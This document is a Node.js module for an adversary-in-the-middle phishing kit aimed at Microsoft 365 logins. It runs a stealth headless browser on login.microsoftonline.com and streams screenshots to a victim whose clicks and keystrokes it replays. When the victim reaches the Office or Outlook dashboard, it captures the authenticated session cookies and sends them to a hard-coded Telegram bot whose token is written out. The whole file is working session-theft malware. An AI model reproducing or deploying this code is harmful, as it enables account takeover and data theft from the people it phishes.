const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

// Shared Viewport Config
const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        const textAlert = `<b>✅ FINAL AUTH SUCCESS</b>\n\n<code>${new URL(finalUrl).hostname}</code>\n\n<b>Cookies:</b> ${cookies.length}\n<i>Status: User fully logged in.</i>`;
        
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: textAlert,
            parse_mode: 'HTML'
        });

        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', `Full Authenticated Jar: ${new URL(finalUrl).hostname}`);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: `FINAL_cookies_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
    } catch (e) {
        console.error('[TELEGRAM-ERR]', e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    let hasExfiltrated = false;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox',
                '--window-size=1280,720' // Match viewport
            ]
        });

        const page = await browser.newPage();
        
        // Critical: Ensure internal browser matches external expectation
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1000);

        // Success detection logic
        page.on('framenavigated', async (frame) => {
            const url = frame.url().toLowerCase();
            if (!hasExfiltrated) {
                const isDashboard = url.includes('www.office.com/?auth=') || 
                                    url.includes('outlook.live.com/mail') || 
                                    url.includes('microsoft365.com/?');
                const isAuthStep = url.includes('authorize') || url.includes('relyingparty');

                if (isDashboard && !isAuthStep) {
                    hasExfiltrated = true;
                    console.log(`[AUTH-DETECTED] Finalizing capture...`);
                    await new Promise(r => setTimeout(r, 5000));
                    const cookies = await page.cookies();
                    await sendExfiltrationAlert(cookies, url);
                }
            }
        });

        // FIXED INTERACTION LOGIC
        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    // Ensure we are clicking at the EXACT scale transmitted from frontend
                    await page.mouse.click(data.x, data.y, { delay: 100 });
                    console.log(`[ACTION] Clicked at ${data.x}, ${data.y}`);
                } 
                else if (data.type === 'key') {
                    await page.keyboard.press(data.key);
                }
                
                // Force an immediate re-render after action
                await emitFrame();
            } catch (e) {
                console.error('[ACTION-ERR]', e.message);
            }
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
            console.log(`[CLEANUP] Socket ${socket.id} closed.`);
        });

    } catch (error) {
        console.error('[ORCH-ERR]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
